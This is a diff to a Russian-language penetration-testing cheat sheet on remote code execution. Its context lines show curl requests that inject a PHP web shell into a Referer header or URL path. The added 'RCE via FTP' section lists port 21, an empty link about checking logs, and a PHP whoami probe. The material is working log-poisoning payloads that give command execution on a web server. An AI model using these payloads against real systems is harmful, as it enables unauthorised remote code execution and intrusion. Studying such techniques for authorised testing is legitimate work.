@@ -177,6 +177,11 @@ curl -H "Referer: <?php system(\$_GET['c']); ?>" http://target.com/
 ```bash
 curl "http://target.com/<?php system(\$_GET['cmd']); ?>"
 ```
+### RCE через FTP
+
+* 21 порт 
+* [Проверить логи]()
+* проверить восзможность выполнения команд например ```<?php echo `whoami`;?>```
 
 ### RCE через SSH
 
